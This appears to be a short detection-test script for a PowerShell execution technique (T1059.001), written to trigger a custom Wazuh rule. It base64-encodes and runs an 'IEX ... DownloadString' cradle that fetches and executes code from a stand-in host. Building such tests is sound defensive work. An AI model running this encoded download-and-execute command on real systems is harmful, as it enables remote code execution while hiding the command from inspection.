# T1059.001 - Command and Scripting Interpreter: PowerShell
# Simulates encoded PowerShell command execution
# Expected detection: Wazuh rule 100002 (custom)

$cmd = 'IEX (New-Object Net.WebClient).DownloadString(''http://test.com'')'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc
